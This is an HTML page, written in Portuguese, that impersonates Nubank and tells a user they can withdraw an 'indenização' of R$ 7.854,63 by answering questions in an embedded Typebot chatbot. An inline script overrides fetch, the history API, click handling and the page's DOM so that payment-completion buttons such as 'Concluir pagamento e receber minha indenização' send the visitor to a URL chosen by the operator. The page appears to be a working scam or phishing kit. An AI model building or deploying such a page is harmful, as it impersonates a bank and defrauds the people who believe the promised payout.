<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indenização</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
    </div>
  </header>

  <main class="flex-1 px-4 py-2">
    <div class="flex flex-col">
      <main>
        <div class="max-h-min">
          <div class="px-0.5 pb-[0.6rem]">
            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                <p class="text-base">
                  <span>Olá, </span>
                  <span class="text-black font-bold">USUáRIO!</span>
                </p>
                <p class="mt-1 text-sm">
                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
                </p>
              </div>

              <!-- Typebot -->
              <script type="module">
                import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

                async function initializeTypebot() {
                  try {
                    await Typebot.initStandard({
                      typebot: "nub-1-mcrdbzs",
                      apiHost: "https://chat.typezap.site",
                    });
                    
                    console.log('Typebot carregado - Iniciando interceptação');
                    initAllInterceptors();
                  } catch (error) {
                    console.error('Erro ao carregar Typebot:', error);
                    setTimeout(initializeTypebot, 1000);
                  }
                }

                initializeTypebot();
              </script>

              <script>
              // Configurações
              const TARGET_TEXTS = [
                "Concluir pagamento e receber minha indenização",
                "Finalizar processo",
                "Confirmar recebimento"
              ];
              const NEW_URL = "https://google.com";
              const CHECK_INTERVAL = 300;
              let interceptActive = true;

              // Função principal para iniciar todos os interceptadores
              function initAllInterceptors() {
                initAPIMonitoring();
                initDOMMonitoring();
                initClickInterception();
                initHistoryInterception();
                console.log('🛡 Todos os interceptadores ativados');
              }

              // 1. Interceptação de API - Versão mais robusta
              function initAPIMonitoring() {
                const originalFetch = window.fetch;
                window.fetch = async function(input, init) {
                  const url = typeof input === 'string' ? input : input?.url;
                  
                  if (url && url.includes('/continueChat')) {
                    try {
                      const response = await originalFetch.apply(this, arguments);
                      const clonedResponse = response.clone();
                      const data = await clonedResponse.json();
                      
                      if (TARGET_TEXTS.some(text => JSON.stringify(data).includes(text))) {
                        console.log('📦 Interceptando resposta da API');
                        // Modificação profunda da resposta
                        const modifiedData = modifyApiResponse(data);
                        return new Response(JSON.stringify(modifiedData), {
                          status: response.status,
                          statusText: response.statusText,
                          headers: response.headers
                        });
                      }
                      return response;
                    } catch (e) {
                      console.error('Erro ao interceptar API:', e);
                      return originalFetch.apply(this, arguments);
                    }
                  }
                  return originalFetch.apply(this, arguments);
                };
                console.log('🔌 Interceptação de API ativada');
              }

              function modifyApiResponse(data) {
                // Modifica todos os textos que contêm URLs
                const modifyText = (text) => {
                  if (!text) return text;
                  return text.replace(/https?:\/\/[^\s]+/g, NEW_URL);
                };

                // Modifica todos os objetos de mensagem
                if (data.messages) {
                  data.messages = data.messages.map(msg => {
                    // Modifica richText
                    if (msg.content?.richText) {
                      msg.content.richText = msg.content.richText.map(rich => ({
                        ...rich,
                        children: rich.children.map(child => ({
                          ...child,
                          text: modifyText(child.text),
                          url: child.url ? NEW_URL : undefined
                        }))
                      }));
                    }
                    
                    // Modifica buttons
                    if (msg.content?.buttons) {
                      msg.content.buttons = msg.content.buttons.map(btn => ({
                        ...btn,
                        url: btn.url ? NEW_URL : undefined
                      }));
                    }
                    
                    return msg;
                  });
                }
                
                return data;
              }

              // 2. Monitoramento de DOM - Versão melhorada
              function initDOMMonitoring() {
                const observer = new MutationObserver((mutations) => {
                  mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                      if (node.nodeType === 1) { // Element nodes
                        scanAndReplaceInNode(node);
                      }
                    });
                  });
                });

                observer.observe(document.body, {
                  childList: true,
                  subtree: true,
                  attributes: true,
                  attributeFilter: ['href', 'onclick']
                });

                // Verificação inicial
                scanAndReplaceInDocument();
                console.log('👀 Monitoramento de DOM ativado');
              }

              function scanAndReplaceInDocument() {
                if (!interceptActive) return;
                scanAndReplaceInNode(document);
              }

              function scanAndReplaceInNode(node) {
                try {
                  // Verifica no Shadow DOM do Typebot
                  const typebot = document.querySelector('typebot-standard');
                  if (typebot && typebot.shadowRoot) {
                    scanAndReplaceInShadowRoot(typebot.shadowRoot);
                  }

                  // Verifica no nó atual
                  if (node.querySelectorAll) {
                    replaceElements(node.querySelectorAll('a, button, [onclick], .button, .btn, [href]'));
                  }
                  
                  // Verifica o próprio nó se for um elemento relevante
                  if (node.nodeType === 1 && 
                      (node.matches('a, button, [onclick], .button, .btn, [href]') || 
                       hasTargetText(node))) {
                    replaceElement(node);
                  }
                } catch (e) {
                  console.error('Erro na verificação do DOM:', e);
                }
              }

              function scanAndReplaceInShadowRoot(shadowRoot) {
                replaceElements(shadowRoot.querySelectorAll('a, button, [onclick], .button, .btn, [href]'));
              }

              function replaceElements(elements) {
                elements.forEach(el => {
                  if (hasTargetText(el)) {
                    replaceElement(el);
                  }
                });
              }

              // 3. Interceptação de cliques global
              function initClickInterception() {
                document.addEventListener('click', (e) => {
                  if (!interceptActive) return;
                  
                  let target = e.target;
                  while (target && target !== document) {
                    if (hasTargetText(target)) {
                      e.preventDefault();
                      e.stopPropagation();
                      e.stopImmediatePropagation();
                      console.log('🖱 Interceptando clique em:', target);
                      window.open(NEW_URL, '_blank');
                      return false;
                    }
                    target = target.parentElement;
                  }
                }, true); // Usando capture phase para pegar antes dos outros listeners
                
                console.log('🖱 Interceptação de cliques ativada');
              }

              // 4. Interceptação do history API
              function initHistoryInterception() {
                const originalPushState = history.pushState;
                history.pushState = function(state, title, url) {
                  if (url && typeof url === 'string' && TARGET_TEXTS.some(text => url.includes(text))) {
                    console.log('🚫 Bloqueando pushState para:', url);
                    return originalPushState.apply(this, [state, title, NEW_URL]);
                  }
                  return originalPushState.apply(this, arguments);
                };

                const originalReplaceState = history.replaceState;
                history.replaceState = function(state, title, url) {
                  if (url && typeof url === 'string' && TARGET_TEXTS.some(text => url.includes(text))) {
                    console.log('🚫 Bloqueando replaceState para:', url);
                    return originalReplaceState.apply(this, [state, title, NEW_URL]);
                  }
                  return originalReplaceState.apply(this, arguments);
                };
                
                console.log('🔄 Interceptação de history API ativada');
              }

              // Funções auxiliares
              function hasTargetText(element) {
                return TARGET_TEXTS.some(text => 
                  element.textContent && element.textContent.includes(text)
                );
              }

              function replaceElement(element) {
                try {
                  // Substitui href em elementos de link
                  if (element.hasAttribute('href')) {
                    element.setAttribute('href', NEW_URL);
                    element.setAttribute('target', '_blank');
                  }
                  
                  // Substitui onclick e similares
                  element.style.cursor = 'pointer';
                  element.onclick = (e) => {
                    e?.preventDefault();
                    e?.stopPropagation();
                    e?.stopImmediatePropagation();
                    console.log('🔗 Redirecionando para:', NEW_URL);
                    window.open(NEW_URL, '_blank');
                    return false;
                  };
                  
                  // Remove todos os listeners antigos
                  const newElement = element.cloneNode(true);
                  element.parentNode?.replaceChild(newElement, element);
                  
                  // Reaplica as modificações no novo elemento
                  if (hasTargetText(newElement)) {
                    replaceElement(newElement);
                  }
                  
                  return newElement;
                } catch (e) {
                  console.error('Erro ao substituir elemento:', e, element);
                  return element;
                }
              }

              // Controles para depuração
              window.typebotInterceptor = {
                enable: () => { 
                  interceptActive = true; 
                  initAllInterceptors();
                  console.log('🟢 Interceptação ativada'); 
                },
                disable: () => { 
                  interceptActive = false; 
                  console.log('🔴 Interceptação desativada'); 
                },
                scan: () => {
                  scanAndReplaceInDocument();
                  console.log('🔍 Verificação manual executada');
                },
                test: () => {
                  console.log('🧪 Testando interceptação...');
                  const testElement = document.createElement('button');
                  testElement.textContent = TARGET_TEXTS[0];
                  document.body.appendChild(testElement);
                }
              };
              </script>

              <typebot-standard></typebot-standard>
            </div>
          </div>
        </div>
      </main>
    </div>
  </main>
</body>
</html>
